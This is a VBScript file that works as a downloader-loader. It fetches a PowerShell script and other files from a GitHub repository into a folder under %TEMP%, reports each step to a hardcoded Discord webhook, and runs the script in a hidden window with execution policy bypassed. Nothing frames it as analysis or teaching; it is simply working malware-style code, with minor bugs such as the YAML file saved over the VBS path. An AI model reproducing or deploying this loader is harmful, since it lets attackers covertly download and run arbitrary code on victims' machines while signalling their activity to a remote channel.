Option Explicit

Dim objXMLHTTP, objADOStream, objFSO, objShell
Dim strPs1URL, strWinURL, strEnvYmlURL
Dim strRootPath, strPs1Path, strWinPath, strEnvYmlPath
Dim intWait
Dim strWebhookURL, strOutput

strWinURL = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/win.vbs"
strPs1URL = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/setup-lua.ps1"
strEnvYmlURL = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/environment.yml"

' Create WScript.Shell object to get the environment variable
Set objShell = CreateObject("WScript.Shell")

' Root directory in TEMP folder
strRootPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\ZZ\"

strPs1Path = strRootPath & "setup-lua.ps1"
strWinPath = strRootPath & "win.vbs"
strEnvYmlPath = strRootPath & "environment.yml"

intWait = 5000 ' 5 seconds in milliseconds
strWebhookURL = "https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"

Set objFSO = CreateObject("Scripting.FileSystemObject")

' Function to send output to Discord using WinHTTP
Function SendToDiscord(message)
    Dim objWinHTTP, strRequestBody
    Set objWinHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    strRequestBody = "{""content"":""" & message & """}"
    objWinHTTP.Open "POST", strWebhookURL, False
    objWinHTTP.SetRequestHeader "Content-Type", "application/json"
    objWinHTTP.Send strRequestBody
End Function

' Function to download files
Function DownloadFile(url, localFile)
    Dim objXMLHTTP, objADOStream
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    Set objADOStream = CreateObject("ADODB.Stream")
    
    objXMLHTTP.open "GET", url, False
    objXMLHTTP.send
    
    objADOStream.Type = 1 ' adTypeBinary
    objADOStream.Open
    objADOStream.Write objXMLHTTP.responseBody
    objADOStream.SaveToFile localFile, 2 ' adSaveCreateOverWrite
    objADOStream.Close
    
    SendToDiscord "Downloaded: " & url
End Function

' Create root folder
If Not objFSO.FolderExists(strRootPath) Then
    objFSO.CreateFolder(strRootPath)
    SendToDiscord "Created root folder: " & strRootPath
End If

' Download PowerShell script if it does not exist
SendToDiscord "Starting download of PowerShell script..."
If Not objFSO.FileExists(strPs1Path) Then DownloadFile strPs1URL, strPs1Path

' Download vbs script if it does not exist
SendToDiscord "Starting download of PowerShell script..."
If Not objFSO.FileExists(strWinPath) Then DownloadFile strWinURL, strWinPath

' Download yml file if it does not exist
SendToDiscord "Starting download of yml file..."
If Not objFSO.FileExists(strEnvYmlPath) Then DownloadFile strEnvYmlURL, strWinPath

SendToDiscord "Download completed. Waiting for 1 minute..."
WScript.Sleep intWait

' Execute the PowerShell script
Dim objProcess, strExecResult
Set objProcess = CreateObject("WScript.Shell")
If objFSO.FileExists(strPs1Path) Then
    SendToDiscord "Executing PowerShell script..."
    objProcess.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File """ & strPs1Path & """", 0, False
    SendToDiscord "Executed: " & strPs1Path
End If
